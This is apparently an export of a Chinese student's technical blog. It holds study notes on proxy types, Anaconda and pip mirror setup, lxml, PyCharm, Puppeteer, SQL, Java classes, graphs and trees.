FTP代理服务器：用于访问FTP服务器，一般有上传，下载，缓存功能，port：21，2121。 HTTP代理服务器：主要用于访问网页，一般有内容过滤与缓存功能，port：80，8080，3128。 SSL/TLS代理：访问加密网站，一般有SSL/TLS加密功能，port：443。 RTSP代理：访问Real流媒体服务器，缓存功能，port：554. Telnet代理：telnet远程控制（黑客入侵计算机时常用于隐藏身份？），port：23。 POP3/SMTP代理：主要用于POP3/SMTP方式收发邮件，缓存，port：110，25. SOCKS代理：单纯传递数据包，不关系具体协议与用法，速度快很多，缓存，port：1080.分为SOCKS4和SOCKS5，前者支持TCP，后者支持TCP与UDP，还支持各种身份验证机制，服务器域名解析等，子集关系。 高度匿名代理：数据包原封不动转发，服务端看起来就是普通用户，IP为代理服务器IP。 普通匿名代理：会在数据包上做一些改动，服务端有可能察觉是代理服务器，可能追查到客户端IP。代理服务器通常加入的HTTP头又HTTP-VIA和HTTP-X-FORWARD-FOR。 透明代理：不但改动数据包，还告诉客户端真是IP。除了能用缓存技术提高浏览速度，能用内容过滤提高安全性，无其他 显著作用，如内网中的硬件防火墙。 常见代理设置：使用网上免费代理：最好使用高匿代理。 使用付费代理：网络上许多代理商。 ADSL拨号：拨一次号换一次IP，稳定性高。]]></content>
      <tags>
        <tag>python3网络爬虫开发实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Anaconda教程]]></title>
    <url>%2F2020%2F03%2F16%2FAnaconda%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Anaconda指的是一个开源的Python发行版本，其包含了Python、conda等180多个科学包及其依赖项。 因为包含了大量的科学包，Anaconda 的下载文件比较大。Anaconda对于python初学者而言及其友好，相比单独安装python主程序，选择Anaconda可以帮助省去很多麻烦，Anaconda里添加了许多常用的功能包，如果单独安装python，这些功能包则需要一条一条自行安装，在Anaconda中则不需要考虑这些，同时Anaconda还附带捆绑了两个非常好用的交互式代码编辑器（Spyder、Jupyter notebook）。 1.安装什么的就略过，没什么大问题。 2.安装完后用下面的命令检查是否安装成功以及升级以及安装的库 12conda --versionconda upgrade --all 3.最好换上国内的镜像源，如清华的： 1234conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/conda config --set show_channel_urls yes 在anaconda prompt中执行，并且删去C:\User\Lenovo.condarc中的 1- defaults 查看配置的命令： 1conda config --show 4.碰上清华的镜像源也不太好用，搞了很久一直报错： 123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; 最后重启居然好了，玄学，应该是某些配置需要重启生效吧。 5.安装scrapy的时候发现还是不行，得，继续肝吧。 6.升级Anaconda 1conda update conda 7.Anaconda环境管理 1conda info –envs 列出所有的环境 8.创建一个环境 1conda create -n env_name python=2.7 9.镜像源不是加的越多越好,一个一个试试最好。 10. 1[WinError 193] %1 不是有效的 Win32 应用程序。 这个报错产生的原因是python位数和dll位数不一样，dll是32位，而python是64位。（还是第一次知道python也有64位32位之分）。 解决办法： 1.安装64位的dll(一般很难找到)。 2.安装32位的python，同时用anaconda保证64位的与32位的共存。 具体步骤如下： 12set CONDA_FORCE_32BIT=1是切换到32位，set CONDA_FORCE_32BIT=是切换到64位。//这样切换环境对已经安装的python没有任何影响，原来是64位的python还是64位，所以需要切换到32位以后创建个虚拟环境安装python。并且安装需要在prompt下进行，在navigator中默认python是64位的。 讲道理我觉得scrapy作为这么著名的框架，应该不会出现这种问题吧。 11.切换虚拟环境 1conda acticvate env_name,conda deactivate env_name 12.移除环境： 1conda deactivate env_name 13.查看当前代理优先级： 1conda config --get channels 14.与Pycharm连接 在工作环境中我们会集成开发环境去编码, 这里推荐JB公司的PyCharm, 而PyCharm也能很方便的和anaconda的虚拟环境结合 在Setting =&gt; Project =&gt; Project Interpreter 里面修改 Project Interpreter , 点击齿轮标志再点击Add Local为你某个环境的python.exe解释器就行了 15.长期更换pip镜像源 -i 阿里云 https://mirrors.aliyun.com/pypi/simple/ 电子科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 豆瓣(douban) http://pypi.douban.com/simple/ 清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ 中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/修改源方法： 临时使用：可以在使用pip的时候在后面加上-i参数，指定pip源eg: pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple 永久修改：linux:修改 ~/.pip/pip.conf (没有就创建一个)， 内容如下： 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple windows:直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容如下 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python lxml库中etree的简单应用]]></title>
    <url>%2F2020%2F03%2F13%2Fpython-lxml%E5%BA%93%E4%B8%ADetree%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.etree.HTML() 它可以用来解析字符串格式的HTML文档对象，将传进去的字符变成_Element对象，方便使用getparent(),remove(),xpath()等方法。 例如 12345678#encoding=utf8from lxml import etreehtml = &apos;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This is a test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&apos;_element = etree.HTML(html)解析字符串格式的HTML对象text = _element.xpath(&apos;//h1/text()&apos;)etree.HTML方便利用xpath()等方法。print(&apos;result is :&apos;,text)得到result is:[&apos;This is a test&apos;]//可知xpath返回的只是列表，所以在使用此方法时，只获取第一个元素。 2.etree.tostring() 用于将_element对象转换成字符串。，通过简单的表达式无法得到结果时使用。 1&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This &lt;a&gt;is a &lt;/a&gt;test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 若用”//h1/text()”得到”This”和”test”,用”//h1//text()得到”This”” is a “”test”,etree方法可以传递多个参数，element_or_tree,encoding,method.可以将列表拼接成字符串。 1result = etree.tostring(_h[0],method=&apos;text&apos;)method为text时，表示返回_element对象中的所有文本。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pycharm使用时遇到的问题]]></title>
    <url>%2F2020%2F03%2F13%2Fpycharm%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1.cmd中查看python安装了哪些第三方库命令：pip list。 2.手动下载python第三方库：在网站下载后缀为.whl的文件，并且将下载的文件放入C:user/xxx/文件夹中，利用cmd执行pip install 下载的文件名。 3.想安装lxml库学习爬虫&gt;cnoda放弃&gt;手动安装lxml，下好了whl文件pip出现问题&gt;下载的版本不对&gt;查询支持哪些版本&gt;查询版本命令出错&gt;，最后结果是删除了原有的几个python project，重建了一个project勾选了Inherit global site-packages/Make available to all projects。 4.Xpath，在源码中相当于定位地址。 //*[@id=”mainBox”]/main/div[2]/div[1]/h4/a //指根结点，/指往下层寻找，/text()指提取文本内容，/@xxxx指提取属性内容。 5.记住Linux下安装任何软件，找教程都要附上Linux的版本，是Centos还是Ubuntu。 6.python3.7卸载出问题了，找到C盘下&gt;用户&gt;Lenovo&gt;appdata&gt;local&gt;programs,将python文件夹删除后，在添加与删除程序界面repair后可正常卸载。 7.pip 是一个安装和管理 Python 包的工具 , 是 easy_install 的一个替换品。 许多人在第一次使用pip的时候都会出现’pip’ 不是内部或外部命令，也不是可运行的程序或批处理文件。 这是因为直接在Administrator目录下面直接执行pip命令的时候 会在这个目录下面找pip的可执行文件。 而pip是在python目录下面的scripts目录下面的 所以就出现了上面的错误。 python37下可能无pip.exe，python -m ensurepip解决。在我的电脑属性&gt;高级系统设置中配置环境变量。 8.python的第三方库，pip，requests等，可直接在settings&gt;projectxxx&gt;project interpreter中升级。 9.国内镜像源升级pippython -m pip install –upgrade pip -i https://pypi.douban.com/simple。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2020/3/12]]></title>
    <url>%2F2020%2F03%2F12%2Fpuppeteer%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Puppeteer入门 0.Node的安装，在windows下应该没啥问题。今天在centos上试了下，掌握得并不是很好。 在官网下载，一种是源码安装，下载之后编译。另一种是直接解压。 1tar xf node-v12.16.1-linux-x64.tar.xz 但是之后要在全局使用node命令，就要在系统环境变量里面把路径加进去。Windows是明白了，但是Linux没想到。Centos中系统环境变量在 1/etc/profile 目录下。 其实和给npm与node建立软链接是一个作用。 ln -s node的路径 /usr/bin，npm类似。 遇到如下报错，原因是缺少package.json文件，需要执行 npm init 123456npm WARN saveError ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN enoent ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN !invalid#1 No descriptionnpm WARN !invalid#1 No repository field.npm WARN !invalid#1 No README datanpm WARN !invalid#1 No license field. 1.找到一篇博客写的很清楚，正常来说执行 1npm install puppeteer --save 但是因为chromium下载不了，那就 1npm install puppeteer --ignore-scripts --save 然后自己下一个chromium（）要对应版本的，在puppeteer的package.json中查看。最后用FTP传到服务器里去。 2.[学长的博客]https://brickyang.github.io/2019/01/14/%E5%9B%BD%E5%86%85%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85-Puppeteer-%E7%9A%84%E6%96%B9%E6%B3%95/方法一二都试过，但是道行太浅，看不懂应该如何用脚本。从下午四点搞到七点多才做好，方法论引人深思。用淘宝的镜像源装好puppeteer。 3. 4.examples pdf： 123456789101112131415const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;https://news.ycombinator.com&apos;, &#123;waitUntil: &apos;networkidle2&apos;&#125;); // page.pdf() is currently supported only in headless mode. // @see https://bugs.chromium.org/p/chromium/issues/detail?id=753118 await page.pdf(&#123; path: &apos;hn.pdf&apos;, format: &apos;letter&apos; &#125;); await browser.close();&#125;)(); screenshot： 123456789const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;http://example.com&apos;); await page.screenshot(&#123;path: &apos;example.png&apos;&#125;); await browser.close();&#125;)(); 5.总结，对于别人给的命令不能照搬，特别是有路径啥的时候，自己去按照本身情况改。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2019%2F11%2F25%2FSQL%2F</url>
    <content type="text"><![CDATA[一：去掉重复数据的方法 1.distinct 根据单个字段去重，能够精确去重。但作用在多个字段时，只有当这几个字段完全相同才能去重。（要保证每一列都一样）。count(distinct 重复数据所在字段)会返回不重复的条数。 2.group by 在语句最后加上group by+重复数据所在字段。 二：group by的用法 group by必须配合聚合函数用，分组之后可以计数count，求和sum，求平均数avg，max和min等。group by不会将所有信息显示出来，只能得到所需的特定数值。 提到group by就不得不提到HAVING，它与WHERE筛选不同(where是聚合前的筛选，having是聚合后的筛选)，HAVING是对于group by对象进行筛选。它可以用来筛选group by之后的数值符合条件的部分。 GROUP BY 子句:指定用来放置输出行的组。指定 GROUP BY 时，选择列表中任一非聚合表达式内的所有列都应包含在 GROUP BY 列表中，或者 GROUP BY 表达式必须与选择列表表达式完全匹配。如果 SELECT 子句中包含聚合函数，则计算每组的汇总值。 group by语句后接上多个参数时，为了去重需要用where语句进行去重。使用count并重命名的列不用加在group by里。 order by xxx按照xxx排列，desc为降序 三：limit用法 select * from tableName limit i,n tableName：表名 i：为查询结果的索引值(默认从0开始)，当i=0时可省略i n：为查询结果返回的数量 i与n之间使用英文逗号”,”隔开 limit n 等同于 limit 0,n 四：datediff函数 select datediff(year，birthday，gatdate()) 五：模糊查询 select * from XXX where (XXX like ‘%XX’) 六：排序 desc为从高到低 七：left join LEFT JOIN 关键字会从左表 (table_name1) 那里返回所有的行，即使在右表 (table_name2) 中没有匹配的行。 用法如下: 12345&gt; SELECT column_name(s)&gt; FROM table_name1&gt; LEFT JOIN table_name2 &gt; ON table_name1.column_name=table_name2.column_nam&gt; 八：如果是表名或者列名之类的属性，不用加引号。如果是列中的值，或者输入的值，则必须加引号。 九：多表查询 对于n张表，依靠n-1个字段联结的，在select语句中，对要求的多个列名进行查询(作为联结的列名要写出所属表名)，再用where语句对其进行去重，如：学生.学号=选修.学号。 十：子查询返回的值不止一个。当子查询跟随在 =、!=、&lt;、&lt;=、&gt;、&gt;= 之后，或子查询用作表达式时，这种情况是不允许的。这种情况不能在语句中使用等号，要用in select * from 学生where 学生.班号 in (select 班级.班号 from 班级 where (班级.专业编号=’001’)) 子查询就是把一个查询的结果在另一个查询中使用。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java review]]></title>
    <url>%2F2019%2F11%2F23%2FJava-review%2F</url>
    <content type="text"><![CDATA[[TOC] 类的定义在 Java 中定义一个类，需要使用 class 关键字、一个自定义的类名和一对表示程序体的大括号。完整语法如下： 123456789101112&gt; [public][abstract|final]class&lt;class_name&gt;[extends&lt;class_name&gt;][implements&lt;interface_name&gt;] &#123;&gt; // 定义属性部分&gt; &lt;property_type&gt;&lt;property1&gt;;&gt; &lt;property_type&gt;&lt;property2&gt;;&gt; &lt;property_type&gt;&lt;property3&gt;;&gt; …&gt; // 定义方法部分&gt; function1();&gt; function2();&gt; function3();&gt; …&gt; public：表示“共有”的意思。如果使用 public 修饰，则可以被其他类和程序访问。每个 Java 程序的主类都必须是 public 类，作为公共工具供其他类和程序使用的类应定义为 public 类。 abstract：如果类被 abstract 修饰，则该类为抽象类，抽象类不能被实例化，但抽象类中可以有抽象方法（使用 abstract 修饰的方法）和具体方法（没有使用 abstract 修饰的方法）。继承该抽象类的所有子类都必须实现该抽象类中的所有抽象方法（除非子类也是抽象类）。 final：如果类被 final 修饰，则不允许被继承。 class：声明类的关键字。 class_name：类的名称。 extends：表示继承其他类。 implements：表示实现某些接口。 property_type：表示成员变量的类型。 property：表示成员变量名称。 function()：表示成员方法名称。 创建一个新的类，就是创建一个新的数据类型。实例化一个类，就是得到类的一个对象。因此，对象就是一组变量和相关方法的集合，其中变量表明对象的状态和属性，方法表明对象所具有的行为。 (1) 声明类。编写类的最外层框架。 (2) 编写类的属性。类中的数据和方法统称为类成员。其中，类的属性就是类的数据成员。通过在类的主体中定义变量来描述类所具有的特征（属性），这里声明的变量称为类的成员变量。 (3) 编写类的方法。类的方法描述了类所具有的行为，是类的方法成员。可以简单地把方法理解为独立完成某个功能的单元模块。 类的属性:成员变量的定义和声明声明成员变量的语法如下： 12&gt; [public|protected|private][static][final]&lt;type&gt;&lt;variable_name&gt;&gt; 各参数的含义如下。 public、protected、private：用于表示成员变量的访问权限。 static：表示该成员变量为类变量，也称为静态变量。 final：表示将该成员变量声明为常量，其值无法更改。 type：表示变量的类型。 variable_name：表示变量名称。 可以在声明成员变量的同时对其进行初始化，如果声明成员变量时没有对其初始化，则系统会使用默认值初始化成员变量。 实例化，就是对一个对象的各个属性进行赋值的过程。 成员方法声明成员方法可以定义类的行为，行为表示一个对象能够做的事情或者能够从一个对象取得的信息。类的各种功能操作都是通过方法来实现的，属性不过提供了相应的数据。一个完整的方法通常包括方法名称，方法主体，方法参数和方法返回值类型。格式如下： 12345public class Test &#123; [public|private|protected][static]&lt;void|return_type&gt;&lt;method_name&gt;([paramList]) &#123; // 方法体 &#125;&#125; public、private、protected：表示成员方法的访问权限。 static：表示限定该成员方法为静态方法。 final：表示限定该成员方法不能被重写或重载。 abstract：表示限定该成员方法为抽象方法。抽象方法不提供具体的实现，并且所属类型必须为抽象类。 This关键字this.属性名大部分时候，普通方法访问其他方法，成员变量时无需使用this前缀，但是如果方法中有局部变量和成员变量同名，程序又要在该方法里访问这个被覆盖的成员变量，则必须使用this前缀。(我的理解是，传的参数名字与定义的变量名字相同时，为了区分变量与参数，使用this)。 例如定义一个Teacher： 12345public class Teacher &#123; private String name; // 教师名称 private double salary; // 工资 private int age; // 年龄&#125; 上述代码中，三个变量名的作用域是private，因此在类外部无法对其中的变量进行赋值。为了解决这个问题，为Teacher类构造一个方法，然后在该方法中进行传参，赋值。但是问题来了，成员变量名和局部变量名(参数)相同，赋值不了。此时给成员变量名加上this的前缀进行区分。 123456// 创建构造方法，为上面的3个属性赋初始值public Teacher(String name,double salary,int age) &#123; this.name = name; // 设置教师名称 this.salary = salary; // 设置教师工资 this.age = age; // 设置教师年龄&#125; 当一个类的属性（成员变量）名与访问该属性的方法参数名相同时，则需要使用 this 关键字来访问类中的属性，以区分类的属性和方法中的参数。 this.方法名this 可以代表任何对象，当 this 出现在某个方法体中时，它所代表的对象是不确定的，但它的类型是确定的，它所代表的只能是当前类的实例。只有当这个方法被调用时，它所代表的对象才被确定下来，谁在调用这个方法，this 就代表谁。 对象是一个确定的存在 12345678910/** * 第二种定义Dog类方法 **/// 定义一个run()方法，run()方法需要借助jump()方法public void run() &#123; // 使用this引用调用run()方法的对象 this.jump(); System.out.println(&quot;正在执行run方法&quot;);&#125; 在现实世界里，对象的一个方法依赖于另一个方法的情形很常见，例如，吃饭方法依赖于拿筷子方法，写程序方法依赖于敲键盘方法。这种依赖都是同一个对象两个方法之间的依赖。因此，Java 允许对象的一个成员直接调用另一个成员，可以省略 this 前缀。也就是说，将上面的 run( ) 方法改为如下形式也完全正确。 1234public void run() &#123; jump(); System.out.println(&quot;正在执行run方法&quot;);&#125; 注意：对于 static 修饰的方法而言，可以使用类来直接调用该方法，如果在 static 修饰的方法中使用 this 关键字，则这个关键字就无法指向合适的对象。所以，static 修饰的方法中不能使用 this 引用。并且 Java 语法规定，静态成员不能直接访问非静态成员。 setter方法和getter方法： 出于封装考虑，某些class的成员变量通常都声明为private变量，无法直接访问此对象的private属性，通常的做法就是：为private的成员变量声明public的访问接口，称为setter方法与getter方法。 setter： 命名方法：set+变量名，such as setName/setScore；setter方法用于赋值，返回类型都为void getter： 命名方法：get+变量名，such as getName/getScore ；getter方法用于取值，无需输入参数，但是返回类型一定是该成员变量的数据类型。]]></content>
  </entry>
  <entry>
    <title><![CDATA[图]]></title>
    <url>%2F2019%2F11%2F21%2F%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[图的基本概念 顶点(vertex)：数据元素。类似于在线性表中：元素；树中：结点； 图(Graph)：由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为G(V,E),G表示图，V表示顶点的集合，E表示边(edge)的集合。 子图(Subgraph)：B图的顶点和边都属于A图，则B图是A图的子图。 边：顶点Vi到顶点Vj之间的连线没有方向，则称这条连线为边。用小括号(Vi,Vj)或(Vj,Vi)表示。若有方向，则称之为弧(Arc)，用&lt;Vi,Vj&gt;表示。其中Vi是弧尾，Vj是弧头。箭头即弧头。 图中顶点之间的连线全是没有方向的边，则称之为无向图(Undirected graphs).顶点全是有方向的弧，则将该种图称之为有向图(Directed graphs)。 简单图：不存在顶点到其自身的连线，并且同一条连线不重复出现。 对于无向图： 邻接点：与该结点存在边相关联的点称之为邻接点。顶点的度就是与该顶点相关联的边的数目。 对于有向图： 存在弧&lt;Vi,Vj&gt;,则称顶点Vi邻接到Vj，以该顶点为头的弧的数目称为该顶点的入度(Indegree)，反之称之为出度(Outdegree)。 路径：从一个点到另一个点所经过的顶点序列。路径长度：路径上的边或者弧的数目。 回路或环：路径中出发点和终止点为同一点。 简单回路或简单环：路径中出发点与终止点为同一点，而其他顶点互不相同。 简单路径：所有顶点都不相同。 连通图：从顶点Vi到顶点Vj存在路径，则称Vi到Vj是连通的。如果图中任意两个顶点都是连通的，则称其为连通图(Connected Graph)。 连通分量：极大连通子图。 强连通图：从Vi到Vj，以及从Vj到Vi，都存在路径，则称该图为强连通图。 生成树：连接n个结点的n-1条边形成的所极小连通子图。有向图中的极大强连通子图称为有向图的强连通分量。有向图中若干棵有向树连接n个结点，且总共有n-1条弧，构成了生成森林。 无向图中，如果任意两个顶点之间都存在边，则称该图为无向完全图。有向图中，任意两个顶点之间都存在互为相反的两条弧，则称该图为有向完全图。 不管是有向图还是无向图，边/弧比较少时，称之为稀疏图，反之称之为稠密图。 权(Weight)：实际应用时，图的边/弧往往映射为现实中某个具体的信息，附带相关的数字值，这种与图的边/弧相关联的数字的值称之为权。带权的图称之为网(Network)。 图的存储结构邻接矩阵表示法：将顶点与边/弧分别用两个结构来进行存储，并且从中建立关联。邻接矩阵表示法用两个数组来表示图，一个一维数组用于存储图中的顶点信息(存储顺序体现出结点的编号顺序)，一个二维数组(称之为邻接矩阵)用于存储图中边/弧的信息。 arc=①1，若该边/弧存在。②0，反之。 易知，无向图的边数组其实是一个基于主对角线的对称矩阵，编号为i的顶点的度，等于第i行或i列中非0元的个数。有向图的弧数组不再是对称矩阵，而且第i行的非0元个数表示编号为i的顶点的出度，第i列的非0元个数表示编号为i的顶点的入度，整个矩阵的非0元个数等于弧的总数。 使矩阵能够表示出带权值的网，可将权值代替原矩阵中的1. 12345678图的邻接矩阵存储结构#define maxvex 100typedef struct&#123;char vexs[maxvex];int arc[maxvex][maxvex];int vertex,edges;&#125;MGraph; 邻接表表示法：第一部分，用一个一维数组来存储所有顶点的值。第二部分，多个单链表。将该结点(一维数组中的元素)弧尾对应的弧头存储在链表中的data域。 无向图的表示方法与有向图几乎完全相同，但是单链表结点数翻倍(一条边视为两条弧)。对于带权值的网，可以在链表中加入一个存放权值的域。 邻接表的优点在于根据实际的边/弧数目动态确定存储结构(多个单链表)，避免了存储空间的浪费。有向图中很容易确定该顶点的出度(求出单链表表长)，无向图中表长就是顶点的出度。缺点在于在有向图中要获取顶点i的入度非常麻烦，需要遍历出链表中有多少链表中data域为i。 于是出现逆邻接表表示方法：将链表中的data域存放指向当前顶点的弧的弧尾编号。这样获取入度非常简单(同时获取出度很难)。 十字链表表示方法：略。 图的遍历Traversing Graph深度优先遍历(Depth_First_Search,DFS)很难用言语表达清楚，你懂的，类似于树的先序遍历。先一条道走到黑，再一步一步往回走看是否有别的路径。因为可能存在多个符合条件的邻接点，所以图的深度优先遍历序列是不唯一的。 广度优先遍历(Breadth First Search，BFS)①访问任意一个顶点。②访问该顶点所有的邻接点。③访问该顶点的所有邻接点的所有邻接点。④…… 找出当前邻接点的所有外一层邻接点，后按任意序列进行遍历。 最小生成树n个顶点，用n-1条边把一个连通图连接起来，并使得权值之和最小。有Prim算法与Kruskal算法。注意最小生成树与遍历是不一样的，寻找最小生成树时，不要求上一步与下一步之间连续。 Prim算法：观察符合条件的那些边，(边的一个端点是灰色，另一个端点是白色)，并选出其中权值最小的一条。与边数目无关，只与顶点个数有关，适用于稠密图。(稀疏图亦可)。 Kruskal算法：一句话，”不构成环的情况下，选权值最小的边。“与边数目有关，与顶点个数无关，适用于稀疏图。 AOV网：用顶点表示活动，弧表示活动的优先关系的有向图称为AOV网。弧表示活动之间的某种固有的制约关系。 拓扑序列：假设活动Vi是活动Vj的前驱活动，则在顶点序列中顶点Vi必定在顶点Vj的前面。满足这样的条件，则称这样的顶点序列为一个拓扑序列。 拓扑排序：构造拓扑序列的过程。 拓扑排序的方法：每次从AOV网中选择一个入度为0的顶点，输出，然后删去此顶点及所有与他相关的弧。重复上述操作直到，输出全部的顶点，或者AOV网中找不到入度为0的顶点。 AOE网：弧表示每个步骤环节的活动，顶点表示步骤环节开始时或者结束时的状态，权值表示该活动进行所需要的时间，构成的弧表示活动的有向无环图称为AOE网。主要用于解决时间上的一些相关问题。此处常用到顶点i最早呈现时间ve(i),顶点i最晚呈现时间vl(i)。 由于在AOE网中，活动可以并行地进行，所以完成工程的最短时间是从始点到终点的最长路径的最短长度(权值之和)。路径长度最长的路径叫做关键路径。最长路径并不追求最长，反而是保证所有活动完成的最短。 ve(i)等于从出发点到当前点i的最长路径的长度(满足所有状态而非一个状态)。 vl(i)等于总工期与从当前点到终点的最长路径的差值(后面都是理想状态，预留给前面的最多时间)。 ve(i)=vl(i)，顶点i称为关键点，该活动称为关键活动。 最短路径：指的是两个顶点之间经过的边/弧上权值最小的路径。 具体操作： 三行表，i为给顶点的序号，D[i]表示权值，最后一行为路径。 初始化将源点可到的顶点的权值写下。 ①将落脚点标灰（D[i]最小的点） ②修正邻接落脚点的点的路径与D[i]]]></content>
      <tags>
        <tag>Data Structure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tree]]></title>
    <url>%2F2019%2F11%2F17%2FTree%2F</url>
    <content type="text"><![CDATA[[TOC] 树(tree)一：树的相关基本概念： 树是n个节点的有限集(n&gt;=0)，当n=1时，该元素就称为树的根节点，当n&gt;1时，其他节点可分为m个非空且不相交的有限集称为子树(SubTree)。 树的节点包含一个数据元素以及若干指向子树的分支，节点拥有的子树个数称为节点的度(Degree),度为0的节点称为叶子(Leaf)或终端节点，度不为零的节点称为非终端节点/分支节点。 一棵树中各个节点的度的最大值称为该树的度。 节点(双亲节点)的子树的根节点，称为该节点的孩子节点。同一个双亲节点的孩子节点之间互称兄弟(Sibling),双亲节点不相同但处于同一层的互称堂兄弟。 在一棵树中，每个节点都有自己的层次(度表示的是另一个维度)，层次的顺序为：根节点位于1层，树中节点的层次的最大值称为树的深度(Depth)或高度。 在一棵树中，同层的孩子节点左右互换会发生变化，则该树称为有序树，反之称为无序树。 树的几个基本特征：一棵由n个节点组成的树，其边的数目为n-1。如果一个实际问题在建模时无法用一棵树表达，而必须采用多棵互不相交的树来表示，那么这些多棵互不相交的树称为森林。 树的存储结构表示：双亲表示法，孩子表示法，孩子兄弟表示法。(树的存储，关键在于存储数据元素与数据元素之间的关系)。 双亲表示法：假设以一组连续的空间来存储树的所有节点的值，同时在每个节点中设置一个域指示双亲节点在本连续空间中的下标位置。这种存储结构利用了树结构中每个节点(除根节点外)都只有唯一的双亲的性质，用一维数组来存放树的所有节点，并设置parent域，建立节点与双亲的一一映射。具体实施时，注意是数组的下标分别给节点编号，节点并不一定是从根节点开始编的，可能是随机的。parent域即存放双亲节点的数组下标，根节点的parent域存放-1.这种方法无法存放有序树，并且受数组长度的限制。 孩子表示法：把每个节点的孩子节点排列起来，看成一个线性表，并且以单链表存储，则n个节点具有n个孩子链表(叶子节点的孩子链表为空表)，而n个头指针又组成一个线性表。通俗地来说，就是先用一维数组把所有节点进行一次编号，child域指向其中一个孩子节点的数组下标编号，该孩子节点的child域再指向下一个孩子节点的数组下标编号(同层次)。可以表示有序树，但难以确定一个节点的层次，树节点个数同样受数组长度的限制。 二：二叉树 二叉树(Binary Tree)，其特点是每个节点最多有两棵子树，并且有左右之分(有序树)。 在二叉树的第K层上，至多有2^(k-1)个节点。深度为K的二叉树至多有2^k-1个节点。 对于任意一棵二叉树，如果其终端节点数为n0，度为2的节点数为n2，则有n0=n2+1. 先序遍历，中序遍历，后序遍历关键在于根节点的访问顺序不同，遍历的时候要假设两棵子树都存在，要遍历则从最低端的叶子开始。 满二叉树：每一层的节点个数达到最大。 完全二叉树：除了最下面一层叶子节点之外，其他各层节点数达到最大值。并且最后一层叶子节点按照从左到右的顺序连续存在，只缺最后一层若干节点。 三：线索二叉树一般的二叉链表只能找到左右孩子，找不到前驱，后继节点。充分利用二叉链表的空指针，使得在遍历过程中能找到各个节点的先驱后继。线索化就是在遍历中完成对叶子节点的指针添加的过程。指向节点前驱和后继的指针叫做线索，线索二叉树某个节点中的域分别为Lchild,LTag,data,RTag,Rchild.Tag为0表示Lchild/Rchild指孩子，反之指前驱后继节点。 线索树的画法：给出前序遍历序列和中序遍历序列，要求画后序线索树。首先把后序遍历序列写出，之后查看每个节点的左右两边是否有节点。如果左边没有节点，则用虚线指向，后序遍历序列中该节点的左边一个元素。如果右边没有节点，则用虚线指向，后序遍历序列中，该节点右边的一个元素。 四：哈夫曼树(Huffman) 路径长度：从树中一个节点到另一个节点之间的分支构成的路径，分支数目称为路径长度。 树的路径长度：从树根到每一个节点的路径长度之和。 树的带权路径长度：树中所有叶子节点的带权路径长度和。WPL=WkLk从k=1到k=n的求和。对于节点个数相同的树，完全二叉树是路径长度最短的树。 最优二叉树(哈夫曼树)：有n个权值{W1,W2,……，Wn}构造一棵有n个叶子节点的二叉树，每个叶子节点带一个权值，则其中带权路径长度WPL最小的二叉树称为最优二叉树。WPL的计算，通俗地来说就是权值乘以（路径上节点的个数-1）。构造步骤，给出了一组权值，选择两个最小的权值作为子树，根节点的权值为两子树权值之和。注意当根节点的权值小于两最小权值之和时，需要再建立一棵子树。这时选出的两个数字都不是已经构造好的二叉树里面的节点，所以要另外开一棵二叉树。如果两个数的和正好是下一步的两个最小数的其中的一个，那么这个树直接往上生长就可以了，如果这两个数的和比较大，不是下一步的两个最小数的其中一个，那么就并列生长。(构造哈夫曼树常见误区) 哈夫曼编码：利用哈夫曼树求得的用于通信的二进制编码称为哈夫曼编码。树中从根到每个叶子节点都有一条路径，对路径上的各分支约定指向左子树的分支表示”0”码，指向右子树的分支表示”1”码，取每条路径上的”0”或”1”的序列作为各个叶子节点对应的字符编码，即是哈夫曼编码。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2019%2F09%2F20%2FPython%E7%88%AC%E8%99%AB%2F</url>
